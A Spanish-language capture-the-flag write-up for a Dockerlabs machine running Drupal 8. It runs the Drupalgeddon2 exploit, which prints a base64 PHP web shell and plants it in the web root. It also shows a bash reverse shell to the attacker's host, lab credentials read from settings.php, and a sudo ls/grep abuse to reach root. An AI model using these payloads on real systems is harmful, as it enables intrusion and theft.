
# Writeup Template: Maquina `[ ejotapete ]`

- Tags: #ejotapete #Drupal #nologin
- Dificultad: `[ Muy Facil ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina Ejotapete](https://mega.nz/file/KJ8E2TbA#PtpPLqXE1viV_WlHBDWBn6d9rs0Du4nEmXk8or3ynOg) Máquina para explotar una vulnerabilidad en un CMS drupal que no corre en la raíz del puerto 80, así como una escalada de privilegios con dos vías distintas.

## Configuracion del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x ejotapete.zip
sudo bash auto_deploy.sh ejotapete.tar
```

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p80 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
80/tcp open  http    Apache httpd 2.4.25 ((DebianStretch))
```
---

## Enumeracion de [Servicio Web Principal]
direccion **URL** del servicio Y tenemos un codigo de estado **403**:
```bash
http://172.17.0.2
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://172.17.0.2
http://172.17.0.2 [403 Forbidden] Apache[2.4.25], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[172.17.0.2], Title[403 Forbidden]
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 80 172.17.0.2 # No perporta rutas
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -t 20 --add-slash
```

**Hallazgos Relevantes:**
```bash
/drupal/              (Status: 200) [Size: 8892]
```

### Descubrimiento de Archivos
Ahora para el reconocimiento apuntamos a la ruta: **( /drupal )**
```bash
gobuster dir -u http://172.17.0.2/drupal/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -t 20 -x php,php.back,backup,txt,sh,html,js,java,py 
```

- **Hallazgos**:
```bash
/backup (Status: 301) [Size: 315]
/search               (Status: 302) [Size: 388] [--> http://172.17.0.2/drupal/search/node]
/index.php            (Status: 200) [Size: 8902]
```

Una ves que ingresamos a esta ruta, Tenemos un buscador que nos permite filtrar por **keyword**
```bash
http://172.17.0.2/drupal/search/node
```

Search: Enter your keywords, Ahora si ingresamos una cadena de texto como **hola** lo podemos ver reflejado atraves de la url:
```bash
http://172.17.0.2/drupal/search/node?keys=hola

# Search for hola
Enter your keywords
```

Ahora lo que are es probrar si es vulnerable a un **LFI** con **wfuzz** de la siguiente manera:
```bash
wfuzz -c -w /usr/share/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt -u "http://172.17.0.2/drupal/search/node?keys=FUZZ"
```

Por alguna razon no dio resultado asi que procedemos a realizar pruebas manuales al parametro **keys**
```bash
http://172.17.0.2/drupal/search/node?keys=%3Cscript%3Ewindow.alert(%22hacked%22);%3C/script%3E # no xss
172.17.0.2/drupal/search/node?keys={{7*7}}
http://172.17.0.2/drupal/search/node?keys={7*7}
http://172.17.0.2/drupal/search/node?keys=1;%20whoami
```

Revisando la version del gestor **CMS Drupal**
```bash
http://172.17.0.2/drupal/core/CHANGELOG.txt

New minor (feature) releases of Drupal 8 are released every six months and
patch (bugfix) releases are released every month. More information on the
Drupal 8 release cycle: https://www.drupal.org/core/release-cycle-overview

* For a full list of fixes in the latest release, visit:
 https://www.drupal.org/8/download
* API change records for Drupal core:
 https://www.drupal.org/list-changes/drupal
```

Buscando en internten vemos que la version de drupal es 12, Asi que esto inidca que tenemos version desactualizada y mas seguro vulnerable:
```bash
The latest major version of Drupal is ==Drupal 11==, released in July 2024. Drupal 10 will receive security updates until Drupal 12 is released, which is anticipated in mid-late 2026. Drupal 7 reached its end of life on January 5, 2025
```

Comprobamos la version mediante **curl**
```bash
curl -s -X GET http://172.17.0.2/drupal/ | grep "drupal"

<meta name="Generator" content="Drupal 8 (https://www.drupal.org)" />
<link rel="shortcut icon" href="/drupal/core/misc/favicon.ico" type="image/vnd.microsoft.icon" />
<link rel="alternate" type="application/rss+xml" title="" href="http://172.17.0.2/drupal/rss.xml" />
    <link rel="stylesheet" href="/drupal/sites/default/files/css/css_R_6vm3WffQ760L7tOso1MrCvb2yhkuMBF96k0UhZ_dw.css?0" media="all" />
<link rel="stylesheet" href="/drupal/sites/default/files/css/css_97NGigb7VWVuTTDanLjKsObBB7Rnq8-4zw2MRgeCJ88.css?0" media="all" />
<link rel="stylesheet" href="/drupal/sites/default/files/css/css_Z5jMg7P_bjcW9iUzujI7oaechMyxQTUqZhHJ_aYSq04.css?0" media="print" />
<script src="/drupal/sites/default/files/js/js_VtafjXmRvoUgAzqzYTA3Wrjkx9wcWhjP0G4ZnnqRamA.js"></script>
        <a href="/user/login" data-drupal-link-system-path="user/login">Log in</a>
        <a href="/" data-drupal-link-system-path="&lt;front&gt;" class="is-active">Home</a>
      No front page content has been created yet.<br />Follow the <a target="_blank" href="https://www.drupal.org/docs/user_guide/en/index.html">User Guide</a> to start building your site.
    <div class="search-block-form block block-search container-inline" data-drupal-selector="search-block-form" id="block-bartik-search" role="search">
        <input title="Enter the terms you wish to search for." data-drupal-selector="edit-keys" type="search" id="edit-keys" name="keys" value="" size="15" maxlength="128" class="form-search" />
<div data-drupal-selector="edit-actions" class="form-actions js-form-wrapper form-wrapper" id="edit-actions"><input class="search-form__submit button js-form-submit form-submit" data-drupal-selector="edit-submit" type="submit" id="edit-submit" value="Search" />
        <a href="/contact" data-drupal-link-system-path="contact">Contact</a>
      <span>Powered by <a href="https://www.drupal.org">Drupal</a></span>
```

Ahora que sabemos la version podemos buscar un exploit para esta version: Clonamos este exploit
```bash
git clone https://github.com/dreadlocked/Drupalgeddon2
```

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Ejecutaremos el siguiente comando para lanzar el exploit apuntando a la version vulnerable de node y drupal
```bash
ruby drupalgeddon2.rb http://172.17.0.2/drupal
```

### Ejecucion del Ataque
Una ves ejecutao tendremos informacion, Donde nos indica que se a subido un archivo maliciosos **shell.php** el cual nos permite realizar una llamada a nivel de sistema para ajecutar comandos
```bash
# Comandos para explotación
[*] --==[::#Drupalggedon2::]==--
--------------------------------------------------------------------------------
[i] Target : http://172.17.0.2/drupal/
--------------------------------------------------------------------------------
[+] Header : v8 [X-Generator]
[!] MISSING: http://172.17.0.2/drupal/CHANGELOG.txt    (HTTP Response: 404)
[+] Found  : http://172.17.0.2/drupal/core/CHANGELOG.txt    (HTTP Response: 200)
[!] MISSING: http://172.17.0.2/drupal/core/CHANGELOG.txt    (HTTP Response: 200)
[+] Header : v8 [X-Generator]
[!] MISSING: http://172.17.0.2/drupal/includes/bootstrap.inc    (HTTP Response: 404)
[!] MISSING: http://172.17.0.2/drupal/core/includes/bootstrap.inc    (HTTP Response: 403)
[!] MISSING: http://172.17.0.2/drupal/includes/database.inc    (HTTP Response: 404)
[+] Found  : http://172.17.0.2/drupal/    (HTTP Response: 200)
[+] Metatag: v8.x [Generator]
[!] MISSING: http://172.17.0.2/drupal/    (HTTP Response: 200)
[+] Drupal?: v8.x
--------------------------------------------------------------------------------
[*] Testing: Form   (user/register)
[+] Result : Form valid
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Clean URLs
[+] Result : Clean URLs enabled
--------------------------------------------------------------------------------
[*] Testing: Code Execution   (Method: mail)
[i] Payload: echo UTBHIYKI
[+] Result : UTBHIYKI
[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
--------------------------------------------------------------------------------
[*] Testing: Existing file   (http://172.17.0.2/drupal/shell.php)
[i] Response: HTTP 404 // Size: 16
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Writing To Web Root   (./)
[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php
[+] Result : <?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }
[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!
--------------------------------------------------------------------------------
[i] Fake PHP shell:   curl 'http://172.17.0.2/drupal/shell.php' -d 'c=hostname'
982f46e160bb>> 
```

Nos indica la ruta donde esta nuestro archvio malicioso e nos indica bajo que parametro podemos ejecutar comando: **c**:
```bash
[i] Fake PHP shell:   curl 'http://172.17.0.2/drupal/shell.php' -d 'c=hostname'
```

Comprobamos el **RCE** para ver si podemos ejecutar comando de manera exitosa:
```bash
http://172.17.0.2/drupal/shell.php?c=whoami

www-data # RCE
```
### Intrusion
Ahora que tenemos **RCE** nos ponemos en escucha en nuestra maquina de atacante:
```bash
nc -nlvp 443
```

```bash
# Reverse shell o acceso inicial
172.17.0.2/drupal/shell.php?c=bash -c 'exec bash -i %26>/dev/tcp/172.17.0.1/443 <%261'
```

---

## Escalada de Privilegios
### Enumeracion del Sistema
Enumeramos a los usuarios del sistema
```bash
# Comandos clave ejecutados
cat /etc/passwd | grep "sh"

root:x:0:0:root:/root:/bin/bash
ballenita:x:1000:1000:ballenita,,,:/home/ballenita:/bin/bash
```

### Explotacion de Privilegios

###### Usuario `[ www-data ]`:
Sabiendo que estamos en esta ruta
```bash
982f46e160bb>> pwd
/var/www/html/drupal
```

Procedemos a encontrar credenciales, De la base de datos:
```bash
 cat sites/default/settings.php | grep "password"
 
 * to replace the database username and password and possibly the host and port
 *   'password' => 'ballenitafeliz', //Cuidadito cuidadín pillin
 * username, password, host, and database name.
 *     'password' => 'sqlpassword',
 * You can pass in the user name and password for basic authentication in the
```

Sabiendo que tenemos un usuario bajo el nombre de **ballenita** usaremos la contrasena para intentar loguearnos con este usuario
```bash
# Comando para escalar al usuario: ( ballenita )
su ballenita
```

Intentando loguearnos nos da este mensaje, Indicando que estamos intentando ejecutar comandos en un entorno que no es una terminal interactiva **TTY**, Es decir que tenemos una shell basica
```bash
su: must be run from a terminal
```

Asi que forzamos una bash interactiva con el siguiente comando:
```bash
script /dev/null -c /bin/bash
```

Una ves que sanitizamos la tty, y ya que tenemos una contrasena del usuario **ballenita** procedemos a loguearnos como este usuario:
```bash
su ballenita # ( ballenitafeliz )
```

###### Usuario `[ ballenita ]`:
Listando los permisos para este usuario tenemos lo siguiente:
```bash
User ballenita may run the following commands on 982f46e160bb:
    (root) NOPASSWD: /bin/ls, /bin/grep
```

Nos aprovechamos de esto para ver que existe en el directorio de **root**
```bash
sudo -u root /bin/ls /root
```

Tenemos un archivo **secretitomaximo.txt** que con el binario de **grep** intentaremos acceder a el
```bash
sudo -u root /bin/grep '' /root/secretitomaximo.txt
```

Tenemos lo siguiente que probaremos si es una password valida para el usuario **root**
```bash
su root # ( nobodycanfindthispasswordrootrocks )
```

---

## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
root@982f46e160bb:/home/ballenita# whoami
root
```

---

## Lecciones Aprendidas
1. Aprendimos a explotar una vulnerabilidad del gestor **CMSDrupal** que nos permitio subir un archivio malicioso para ganar acceso al sistema objetivo
2. Aprendimos a escapar de una terminal basica que no permite la ejecucion de comandos: **( /usr/sbin/nologin )**, Forzando para obtener una **TTY** interactiva
3. Aprendimos a abusar el binario de **LS** para ver archivos que a los cuales no teniamos acceso
4. Aprendimos a abusar del binario **grep** para ver el contenido de archivos privilegiados, que nos permitio ganar acceso como **root**